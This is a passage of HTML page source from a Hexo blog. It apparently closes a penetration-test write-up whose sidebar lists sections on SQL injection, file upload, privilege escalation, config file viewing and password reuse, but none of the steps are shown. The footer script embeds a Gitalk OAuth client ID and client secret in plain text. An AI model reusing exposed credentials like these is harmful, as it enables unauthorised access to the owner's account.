href="#SQLi"><span class="toc-number">3.2.</span> <span class="toc-text">SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.3.</span> <span class="toc-text">文件上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B"><span class="toc-number">4.1.</span> <span class="toc-text">配置文件查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">4.2.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%A4%8D%E7%94%A8"><span class="toc-number">4.3.</span> <span class="toc-text">密码复用</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><!-- 不蒜子的js    --><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'https://t3yt3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: 
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>